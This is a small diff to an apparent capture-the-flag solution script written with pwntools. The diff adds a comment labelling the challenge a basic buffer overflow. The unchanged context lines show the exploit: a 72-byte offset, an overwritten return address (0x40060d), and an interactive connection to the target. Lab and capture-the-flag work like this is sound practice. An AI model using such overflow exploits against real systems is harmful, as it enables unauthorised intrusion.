@@ -1,5 +1,9 @@
 #!/usr/bin/env python
 
+'''
+Challenge type --> Basic buffer overflow
+'''
+
 from pwn import *
 
 #overwrite is 72
@@ -12,3 +16,5 @@ payload += p64(0x40060d)
 
 conn.sendline(payload)
 conn.interactive()
+
+
